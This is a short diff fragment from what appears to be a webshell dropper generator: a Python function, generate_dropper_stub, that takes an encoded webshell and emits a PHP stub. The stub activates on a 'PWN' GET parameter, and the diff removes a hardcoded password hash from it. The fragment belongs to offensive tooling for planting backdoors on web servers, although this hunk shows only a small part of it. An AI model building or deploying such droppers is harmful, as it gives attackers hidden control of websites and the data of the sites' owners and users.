@@ -39,8 +39,6 @@ def generate_dropper_stub(encoded_webshell: list):
 
     if (isset($_GET["PWN"])) {{
 
-    $password = "1aa1521ec35ba5cd93021cb142f4bf11";
-
     define('VERSION', 'Project');
 
     $register_key = array
